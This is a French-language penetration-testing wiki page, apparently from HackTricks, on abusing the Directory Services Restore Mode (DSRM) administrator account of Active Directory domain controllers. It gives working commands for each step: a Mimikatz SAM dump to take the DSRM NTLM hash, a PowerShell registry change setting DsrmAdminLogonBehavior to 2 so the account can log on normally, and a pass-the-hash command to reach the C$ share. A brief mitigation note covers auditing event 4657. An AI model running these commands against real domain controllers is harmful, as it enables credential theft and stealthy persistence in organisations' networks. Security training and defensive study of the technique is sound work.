# Identifiants DSRM

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

Chaque contrôleur de domaine dispose d’un compte administrateur Directory Services Restore Mode (DSRM). Son mot de passe est défini lors de la promotion du contrôleur de domaine et est distinct des comptes du domaine Active Directory.<sup>[[1]](#references)</sup>

Un attaquant disposant d’un contrôle administratif sur un contrôleur de domaine peut extraire la base de données SAM locale et récupérer le hash NTLM de l’administrateur DSRM. La commande Mimikatz suivante effectue cette opération :<sup>[[2]](#references)</sup>
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Par défaut, le compte DSRM est destiné au mode de restauration. Définir `DsrmAdminLogonBehavior` sur `2` permet à ce compte local de s’authentifier lorsque le contrôleur de domaine fonctionne normalement. Vérifiez la valeur avant de la modifier :<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue

if ($null -eq $current) {
New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
} else {
Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
}
```
Le hash récupéré peut ensuite être utilisé dans une session pass-the-hash pour accéder à des ressources telles que le partage administratif `C$`. Pour ce compte local, utilisez le nom de l'ordinateur du contrôleur de domaine comme valeur de `/domain`:<sup>[[3]](#references)</sup>
```powershell
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
# In the new PowerShell process, access C$ over NTLM.
ls \\dc-host-name\C$
```
## Mitigation

- Auditez les modifications apportées à `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`. L’événement de sécurité 4657 enregistre une modification de valeur du registre lorsque le SACL de la clé est configuré pour auditer les opérations **Set Value**.<sup>[[4]](#references)</sup>

## References

- [1] [Microsoft : Réinitialiser le mot de passe de l’administrateur du Directory Services Restore Mode](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [2] [ADSecurity : Persistance furtive dans Active Directory n° 11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
- [3] [ADSecurity : Persistance furtive dans Active Directory n° 13 — Persistance DSRM v2](https://adsecurity.org/?p=1785)
- [4] [Microsoft : Événement 4657 — Une valeur du registre a été modifiée](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
{{#include ../../banners/hacktricks-training.md}}
